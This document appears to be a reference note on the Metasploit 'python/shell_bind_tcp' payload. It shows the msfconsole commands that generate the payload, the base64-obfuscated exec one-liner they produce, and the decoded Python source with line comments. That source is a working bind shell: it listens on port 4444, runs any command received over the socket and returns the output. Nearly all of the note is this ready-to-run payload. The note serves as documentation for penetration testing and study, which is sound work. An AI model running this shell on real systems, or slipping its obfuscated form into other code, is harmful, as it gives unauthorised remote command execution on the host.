# python/shell_bind_tcp (single payload)

Source: https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/payload/python/bind_tcp.rb

### Generate
```
msf5 > use python/shell_bind_tcp
msf5 payload(python/shell_bind_tcp) > generate -f raw -o single.py
```

### Result
```python
exec('aW1wb3J0IHNvY2tldCxvcwpzbz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSkKc28uYmluZCgoJycsNDQ0NCkpCnNvLmxpc3RlbigxKQpzbyxhZGRyPXNvLmFjY2VwdCgpCkFTPUZhbHNlCndoaWxlIG5vdCBBUzoKCWRhdGE9c28ucmVjdigxMDI0KQoJc3RkaW4sc3Rkb3V0LHN0ZGVyciw9b3MucG9wZW4zKGRhdGEpCglzdGRvdXRfdmFsdWU9c3Rkb3V0LnJlYWQoKStzdGRlcnIucmVhZCgpCglzby5zZW5kKHN0ZG91dF92YWx1ZSkK'.decode('base64'))
```

### Base64 Decoded Content
```python
import socket,os
so=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
so.bind(('',4444))                                    # bind to first available interface (0.0.0.0)
so.listen(1)                                          # listen (blocking)
so,addr=so.accept()                                   # accept connection
AS=False
while not AS:
	data=so.recv(1024)                                  # recv cmd buffer
	stdin,stdout,stderr,=os.popen3(data)                # exec cmd as subprocess
	stdout_value=stdout.read()+stderr.read()
	so.send(stdout_value)                               # return stdout/stderr
```
